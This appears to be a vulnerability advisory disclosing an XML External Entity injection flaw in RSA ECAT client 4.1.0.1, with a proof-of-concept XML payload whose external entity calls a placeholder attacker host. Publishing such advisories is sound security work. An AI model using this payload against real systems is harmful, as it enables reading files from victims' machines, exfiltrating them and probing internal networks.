Business recommendation:
------------------------
By exploiting the XXE vulnerability, an attacker can get read access to the
filesystem of the user's system using RSA ECAT client and thus obtain sensitive
information from the system. It is also possible to scan ports of the internal
hosts and cause DoS on the affected host.

SEC Consult recommends not to use the product until a thorough security
review has been performed by security professionals and all identified
issues have been resolved.


Vulnerability overview/description:
-----------------------------------
1) XML External Entity Injection
The used XML parser is resolving external XML entities which allows attackers
to read files and send requests to systems on the internal network (e.g port
scanning). The vulnerability can be exploited by tricking the user of
the application to import a whitelisting file with malicious XML code.


Proof of concept:
-----------------
1) XML External Entity Injection (XXE)

The RSA ECAT client allows users to import whitelisting files in XML format.
By tricking the user to import an XML file with malicious XML code to the
application, it's possible to exploit an XXE vulnerability within the application.

For example by importing the following XML code, arbitrary files can be read
from the client's system. The following code generates the connection request
from the client system to attacker system.

===============================================================================
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://[IP:port]/" >]><foo>&xxe;</foo>
===============================================================================

IP:port = IP address and port where the attacker is listening for connections

Furthermore some files can be exfiltrated to remote servers via the
techniques described in:

Vulnerable / tested versions:
-----------------------------
The XXE vulnerability has been verified to exist in the RSA ECAT software
version 4.1.0.1 which was the latest version available at the time of
discovery.
